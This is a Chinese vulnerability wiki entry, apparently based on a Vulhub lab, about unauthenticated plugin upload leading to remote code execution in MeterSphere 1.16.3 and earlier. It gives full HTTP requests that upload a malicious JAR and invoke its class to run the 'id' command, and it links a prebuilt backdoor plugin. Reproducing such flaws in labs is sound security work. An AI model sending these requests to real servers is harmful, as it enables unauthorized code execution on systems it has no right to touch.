---
source: "Threekiii/Vulnerability-Wiki"
title: "MeterSphere 插件接口未授权访问及远程代码执行"
product: "MeterSphere"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "<=1.16.3 claimed;unauth upload plus customMethod; maliciousJAR loading"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-5d2a9866ce444a4d4c0d024d"
entity_id: "ve-5d2a9866ce444a4d4c0d024d"
schema_version: "1"
---

# MeterSphere 插件接口未授权访问及远程代码执行

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：<=1.16.3 claimed;unauth upload plus customMethod; maliciousJAR loading
- 证据范围：More complete chain than26 with explicit upload/error-side-effect and qualified class invocation

### 本次正文校订

- 按实际内容修正 3 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- No fix/version/advisory metadata; incorporatePR9140 from26
- Empty plugin list alone proves list access, not write/execute permissions; keep later steps separate
- Payload/JAR binaries not audited or executed; verify provenance and pin versions
- Static Content-Length placeholders must be recalculated

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

## 漏洞描述

MeterSphere是基于GPLv3协议的一站式的开源持续测试平台。在其1.16.3版本及以前，插件相关管理功能未授权访问，导致攻击者可以通过上传插件的方式在服务器中执行任意代码。

参考连接：

- <https://xz.aliyun.com/t/10772>

## 漏洞环境

执行如下命令启动一个MeterSphere 1.16.3服务器：

```shell
docker compose up -d
```

MeterSphere初始化成功后，访问`http://your-ip:8081`即可跳转到默认登录页面。

## 漏洞复现

首先，我们访问`http://your-ip:8081/plugin/list`可见成功返回插件信息（虽然此时插件为空），说明`/plugin/*`接口存在未授权访问问题，可以利用。

![](./.resource/MeterSphere-插件接口未授权访问及远程代码执行/media/1-16929500427601.png)


利用漏洞前，需要准备一个恶意MeterSphere插件。Vulhub提供了一个已经编译好的[插件](https://github.com/vulhub/metersphere-plugin-Backdoor/releases/tag/v1.1.0)以供测试（**请勿在非授权环境下测试**）。

将恶意插件使用如下数据包上传：

```http
POST /plugin/add HTTP/1.1
Host: localhost:8081
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJV2KX1EL5qmKWXsd
Content-Length: 11985

------WebKitFormBoundaryJV2KX1EL5qmKWXsd
Content-Disposition: form-data; name="file"; filename="Evil.jar"

[Paste your jar file]
------WebKitFormBoundaryJV2KX1EL5qmKWXsd--
```

![](./.resource/MeterSphere-插件接口未授权访问及远程代码执行/media/2-16929500427612.png)


> **如果使用Burpsuite来复现漏洞，你需要注意数据包编码问题，否则可能将无法复现。**

虽然这次上传会返回错误信息，但实际上恶意JAR包已经成功被添加进系统ClassLoader中。

发送如下数据包来执行`org.vulhub.Evil`类中的恶意代码：

```http
POST /plugin/customMethod HTTP/1.1
Host: localhost:8081
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 89

{
  "entry": "org.vulhub.Evil",
  "request": "id"
}
```

![](./.resource/MeterSphere-插件接口未授权访问及远程代码执行/media/3.png)


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
